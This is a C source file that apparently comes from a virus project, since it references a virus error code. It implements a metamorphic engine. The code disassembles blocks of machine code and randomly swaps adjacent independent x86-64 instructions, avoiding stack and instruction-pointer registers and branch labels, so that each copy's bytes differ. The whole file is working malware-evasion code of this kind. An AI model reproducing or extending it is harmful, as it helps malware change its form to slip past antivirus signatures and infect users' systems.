#include <stdbool.h>
#include <stddef.h>
#include "accessors.h"
#include "disasm.h"
#include "blocks.h"
#include "utils.h"
#include "syscalls.h"
#include "errors.h"
#include "compiler_utils.h"
#include "debug.h"

#define INSTRUCTION_PERMUT_WINDOW	8
#define PERMUT_PASSES			1

static bool	want_to_permutate(uint64_t *seed)
{
	return random(seed) % 2;
}
/*
** /!\
** UNKNOWN(~0) and RNO(0) exception:
** An instruction 'A' with unknown register values and an instruction 'B' with
** no modification would lead to a bad permutation.
** This case doesn't appear in the code and is ommited for the sake of
** performance.
** /!\
*/
static bool	can_permutate(const struct operand *a, const struct operand *b)
{
	bool	same_dest      = a->dst & b->dst;
	bool	a_dst_is_b_src = a->dst & b->src;
	bool	b_dst_is_a_src = b->dst & a->src;

	return !(same_dest | a_dst_is_b_src | b_dst_is_a_src);
}

static bool	uses_reserved_registers(const struct operand *a,
			const struct operand *b)
{
	return ((a->src | a->dst | b->src | b->dst) & (RIP | RSP));
}

static bool	is_label(const struct label *labels, size_t nlabels,
			const struct operand *op)
{
	const void	*target = op->addr;
	size_t		left    = 0;
	size_t		right   = nlabels;

	while (left < right)
	{
		size_t	index = (left + right) / 2;

		if (labels[index].location < target)
			left = index + 1;
		else
			right = index;
	}
	return (labels[left].location == target);
}

static void	permutate_neighbors(struct operand *a, struct operand *b)
{
	# ifdef DEBUG
	// small addresses first
	if (a->addr > b->addr)
	{
		permutate_neighbors(b, a);
		return ;
	}
	// check if actually neighbours!
	if (a->addr + a->length != b->addr)
		return (void)errors(ERR_VIRUS, _ERR_V_NOT_NEIGHBORS, _ERR_T_PERMUTATE_NEIGHBOURS);
	# endif

	uint8_t		swap_code[INSTRUCTION_MAXLEN];

	memcpy(swap_code, a->addr, a->length);
	memcpy(a->addr, b->addr, b->length);
	memcpy(a->addr + b->length, swap_code, a->length);
	b->addr = a->addr;
	a->addr = a->addr + b->length;

	struct operand	swap_array;

	swap_array = *a;
	*a = *b;
	*b = swap_array;
}

static void	maybe_permutate(struct operand *a, struct operand *b, uint64_t *seed,
			const struct label *labels, size_t nlabels)
{
	if (can_permutate(a, b)
	&& want_to_permutate(seed)
	&& !uses_reserved_registers(a, b)
	&& !is_label(labels, nlabels, b))
	{
		permutate_neighbors(a, b);
	}
}

static size_t	total_instructions_size(const struct operand instructions[INSTRUCTION_PERMUT_WINDOW],
			size_t n)
{
	size_t	size = 0;

	for (size_t i = 0; i < n; i++)
		size += instructions[i].length;

	return size;
}

bool		permutate_instructions(struct safe_ptr ref, uint64_t seed)
{
	struct block_allocation	block_memory;

	if (!disasm_block(&block_memory, ref))
		return errors(ERR_THROW, _ERR_NO, _ERR_T_PERMUTATE_INSTRUCTIONS);

	struct label	*labels = block_memory.blocks[0].labels;
	size_t		nlabels = block_memory.blocks[0].nlabels;
	size_t		offset  = 0;

	while (true)
	{
		struct operand	instructions[INSTRUCTION_PERMUT_WINDOW];
		void		*ptr = ref.ptr + offset;
		size_t		size = ref.size - offset;
		size_t		n;

		n = disasm_operands(instructions, INSTRUCTION_PERMUT_WINDOW, ptr, size);
		debug_print_operands(instructions, n);

		if (n < 2) break ;

		for (size_t i = 0; i < n * PERMUT_PASSES; i++)
		{
			for (size_t j = 0; j + 1 < n; j++)
			{
				maybe_permutate(&instructions[j], &instructions[j + 1], &seed, labels, nlabels);
			}
		}
		offset += total_instructions_size(instructions, n);
	}
	return true;
}
